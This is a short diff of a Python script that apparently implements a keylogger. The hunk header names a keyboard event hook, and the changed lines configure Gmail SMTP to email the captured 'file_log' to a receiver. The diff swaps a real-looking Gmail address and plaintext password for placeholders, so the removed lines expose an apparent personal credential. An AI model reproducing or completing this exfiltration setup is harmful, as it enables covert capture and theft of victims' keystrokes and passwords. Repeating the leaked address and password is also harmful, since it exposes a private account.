@@ -16,9 +16,9 @@ def OnKeyboardEvent(event):
 
 smtp_adress = 'smtp.gmail.com'
 smtp_port = 465
-email_adress = 'steevy.lelarbin@gmail.com'
-email_password = 'filsdeputain'
-email_receiver = 'sttevy.lelarbin@gmail.com'
+email_adress = 'exemple@gmail.com'
+email_password = 'password'
+email_receiver = 'exemple@gmail.com'
 email_content = file_log
 
 context = ssl.create_default_context()
